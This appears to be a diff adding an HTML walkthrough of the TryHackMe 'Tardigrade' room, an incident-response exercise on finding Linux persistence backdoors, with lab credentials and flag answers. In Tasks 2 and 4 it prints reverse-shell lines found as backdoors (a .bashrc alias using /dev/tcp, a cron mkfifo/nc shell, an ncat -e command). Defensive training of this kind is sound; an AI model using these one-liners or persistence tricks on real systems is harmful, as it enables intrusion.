@@ -156,7 +156,85 @@ body {
 
 <br>
 <br>          
-<h1 id="tryhackme-sighunt-writeup-walkthrough">Tryhackme Tardigrade Writeup/Walkthrough</h1>
+<h1 id="tryhackme-tardigrade-writeup-walkthrough">Tryhackme Tardigrade Writeup/Walkthrough</h1>
+<p>Can you find all the basic persistence mechanisms in this Linux endpoint?</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*8MihpyNG0ehggWVm7v3Xqg.png" alt=""></p>
+<p>Room Link :  <a href="https://tryhackme.com/room/tardigrade">https://tryhackme.com/room/tardigrade</a></p>
+<h1 id="task-1-connect-to-the-machine-via-ssh">Task 1 : Connect to the machine via SSH</h1>
+<p>A server has been compromised, and the security team has decided to isolate the machine until it’s been thoroughly cleaned up. Initial checks by the Incident Response team revealed that there are five different backdoors. It’s your job to find and remediate them before giving the signal to bring the server back to production.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:256/1*xsMF_GiG0dSrnPRPMbrQ2w.png" alt=""></p>
+<p>First, let’s start the Virtual Machine by pressing the Start Machine button at the top of this task. You may access the VM using the AttackBox or your VPN connection.</p>
+<p>To start our investigation, we need to connect to the server. The IR team has provided the credentials for use below and noted that the user has root privileges to the server. I’ll help guide you along at first, but as we progress through each step, I’m sure you’ll feel more comfortable solving these on your own.</p>
+<p>user: giorgio</p>
+<p>password: armani</p>
+<p>To know the os version type &gt; <strong>cat /etc/lsb-release</strong>  in the terminal.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:425/1*lqSAxgTgb7znx0x5s6m6vg.png" alt=""></p>
+<h2 id="answer-the-questions-below-">Answer the questions below :</h2>
+<ol>
+<li>What is the server&#39;s OS version?<br>A. Ubuntu 20.04.4 LTS</li>
+</ol>
+<h1 id="task-2-investigating-the-giorgio-account">Task 2 : Investigating the giorgio account</h1>
+<p>Since we’re in the giorgio account already, we might as well have a look around.</p>
+<p>Some interesting file we found in giorgio’s home directory is .bad_bash</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*v_bb7ZRZJscQFWZI92nOuw.png" alt=""></p>
+<p>Now in the terminal type &gt; <strong>nano .bashrc</strong>  to read its content.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*A8eGoCjVzsdt6pKHNqNXeQ.png" alt=""></p>
+<p>Now in the terminal type &gt; <strong>crontab -e</strong> to find anything interesting about scheduled tasks.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*b3g1UCAFdJj0szE4UCTNKw.png" alt=""></p>
+<h2 id="answer-the-questions-below-">Answer the questions below :</h2>
+<p>1.What&#39;s the most interesting file you found in giorgio&#39;s home directory?<br>A. .bad_bash  </p>
+<ol>
+<li><p>In every investigation, it&#39;s important to keep a dirty wordlist to keep track of all your findings, no matter how small. It&#39;s also a way to prevent going back in circles and starting from scratch again. As such, now&#39;s a good time to create one and put the previous answer as an entry so we can go back to it later.<br>Another file that can be found in every user&#39;s home directory is the .bashrc file. Can you check if you can find something interesting in giorgio&#39;s .bashrc?<br>A. ls=&#39;(bash -i &gt;&amp; /dev/tcp/172.10.6.9/6969 0&gt;&amp;1 &amp; disown) 2&gt;/dev/null; ls --color=auto&#39;  </p>
+</li>
+<li><p>It seems we&#39;ve covered the usual bases in giorgio&#39;s home directory, so it&#39;s time to check the scheduled tasks that he owns.<br>Did you find anything interesting about scheduled tasks?<br>A. /usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/usr/bin/nc 172.10.6.9 6969 &gt;/tmp/f</p>
+</li>
+</ol>
+<h1 id="task-3-dirty-wordlist-revisited">Task 3 : Dirty Wordlist Revisited</h1>
+<p>In the previous task, the concept of a dirty wordlist was introduced. In this task, we will discuss it in more detail.</p>
+<p>A dirty wordlist is essentially raw documentation of the investigation from the investigator’s perspective. It may contain everything that would help lead the investigation forward, from actual IOCs to random notes. Keeping a dirty wordlist assures the investigator that a specific IOC has already been recorded, helping keep the investigation on track and preventing getting stuck in a closed loop of used leads.</p>
+<p>It also helps the investigator remember the mindset that they had during the course of the investigation. The importance of taking note of one’s mindset during different points of an investigation is usually given less importance in favour of focusing on the more exciting atomic indicators; however, recording it provides further context on why a specific bit is recorded in the first place. This is how pivot points are decided and further leads, born and pursued.</p>
+<p>The advantages of a dirty wordlist don’t end here. A quick way to formally document findings at the end of the investigation is to clean them up. It is recommended to put in every sort of detail that may help during the course of the investigation. So, in the end, it would be easy to remove all the unneeded details and false leads, enrich actual IOCs, and establish points of emphasis. The flag for this task is: THM{d1rty_w0rdl1st}</p>
+<h2 id="-_answer-the-questions-below-_-"><strong><em>Answer the questions below :</em></strong></h2>
+<ol>
+<li>This section is a bonus discussion on the importance of a dirty wordlist. Accept the extra point and happy hunting!<br>What is the flag?<br>A. THM{d1rty_w0rdl1st}</li>
+</ol>
+<h1 id="task-4-investigating-the-root-account">Task 4 : Investigating the root account</h1>
+<p>Normal user accounts aren’t the only place to leave persistence mechanisms. As such, we will then go ahead and investigate the root account.</p>
+<p>A few moments after logging on to the root account, we find an error message in our terminal which is given below.</p>
+<p>Then After moving forward with the error message, a suspicious command appears in the terminal as part of the error message as</p>
+<p><strong>ncat -e /bin/bash 172.10.6.9 6969.</strong></p>
+<p><img src="https://miro.medium.com/v2/resize:fit:661/1*ynVkJC4CG53PhSpFho9QwQ.png" alt=""></p>
+<h2 id="answer-the-questions-below-">Answer the questions below :</h2>
+<ol>
+<li><p>A few moments after logging on to the root account, you find an error message in your terminal.<br>What does it say?<br>A. Ncat: TIMEOUT  </p>
+</li>
+<li><p>After moving forward with the error message, a suspicious command appears in the terminal as part of the error message.<br>What command was displayed?<br>A. ncat -e /bin/bash 172.10.6.9 6969  </p>
+</li>
+<li><p>You might wonder, &quot;how did that happen? I didn&#39;t even do anything? I just logged as root, and it happened.&quot;<br>Can you find out how the suspicious command has been implemented?<br>A. .bashrc</p>
+</li>
+</ol>
+<h1 id="task-5-investigating-the-system">Task 5 : Investigating the system</h1>
+<p>After checking the giorgio and the root accounts, it’s essentially a free-for-all from here on, as finding more suspicious items depends on how well you know what’s “normal” in the system.</p>
+<p>wecan find the last persistence mechanism by reading  <strong>/etc/passwd.</strong></p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*XicWIf5G-vhlNjImU3SCDw.png" alt=""></p>
+<h2 id="answer-the-questions-below-">Answer the questions below :</h2>
+<ol>
+<li>There&#39;s one more persistence mechanism in the system.<br>A good way to systematically dissect the system is to look for &quot;usuals&quot; and &quot;unusuals&quot;. For example, you can check for commonly abused or unusual files and directories.<br>This specific persistence mechanism is directly tied to something (or someone?) already present in fresh Linux installs and may be abused and/or manipulated to fit an adversary&#39;s goals. What&#39;s its name?<br>What is the last persistence mechanism?<br>A. nobody</li>
+</ol>
+<h1 id="task-6-final-thoughts">Task 6 : Final Thoughts</h1>
+<p>Now that you’ve found the final persistence mechanism, it’s time to clean up. The persistence mechanisms tackled in this room are common and straightforward; as such, the process of eradicating them is simple.</p>
+<p>The first four persistence mechanisms can be remediated by simply removing the mechanism (e.g. delete the file, remove the commands). The last one, however, involves bringing back the “unusuals” to their “usual” state, which is a bit more complex as you intend for that particular user, file or process to function as before.</p>
+<p>For us adversary left a golden nugget of “advise” somewhere. In order to find the nugget you can take help from below.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*btZgmMUoIjsLQvEiIF-AeQ.png" alt=""></p>
+<p>In order to read the content of nugget type the command cat <strong>.youfoundme</strong></p>
+<p>in the terminal to get the flag.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:599/1*TFkzpJp2AkfT1XGl89s_xw.png" alt=""></p>
+<h2 id="answer-the-questions-below-">Answer the questions below :</h2>
+<ol>
+<li>Finally, as you&#39;ve already found the final persistence mechanism, there&#39;s value in going all the way through to the end.<br>The adversary left a golden nugget of &quot;advise&quot; somewhere.<br>What is the nugget?<br>A. THM{Nob0dy_1s_s@f3}  </li>
+</ol>
+<p><strong>Thankyou For Reading.</strong></p>
+
 
 
 
